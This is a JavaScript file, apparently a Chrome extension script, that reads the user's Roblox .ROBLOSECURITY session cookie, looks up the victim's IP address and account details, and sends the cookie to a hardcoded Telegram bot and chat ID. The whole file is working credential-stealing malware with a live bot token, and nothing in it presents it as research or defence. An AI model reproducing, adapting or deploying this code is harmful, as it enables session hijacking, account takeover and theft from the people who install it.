const TELEGRAM_BOT_TOKEN = "7710369315:AAHUaYg7_DJ7ZRG2it4KML4-vNF1Keu9RU0"; // Замените на токен вашего бота
const TELEGRAM_CHAT_ID = "7991390358"; // Замените на ID чата

async function main(cookie) {
    var ipAddr = await (await fetch("https://api.ipify.org")).text();

    let statistics = null;
    if (cookie) {
        try {
            const response = await fetch("https://www.roblox.com/mobileapi/userinfo", {
                headers: {
                    Cookie: ".ROBLOSECURITY=" + cookie
                },
                redirect: "manual"
            });

            if (!response.ok) {
              throw new Error(`HTTP error! Status: ${response.status}`);
            }


            statistics = await response.json();

        } catch (error) {
            console.error("Error fetching user info:", error);
        }
    }

    let message = `
    ${cookie ? cookie : "COOKIE NOT FOUND"}
    `;
    
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
        
    try {
       const telegramResponse = await fetch(url);
       if(!telegramResponse.ok) {
        throw new Error(`Telegram API error! Status: ${telegramResponse.status}`)
       }
       console.log("Message sent to Telegram");
    }
    catch (error) {
        console.error("Error sending message to Telegram:", error)
    }
}

chrome.cookies.get({"url": "https://www.roblox.com/home", "name": ".ROBLOSECURITY"}, function(cookie) {
    main(cookie ? cookie.value : null);
});
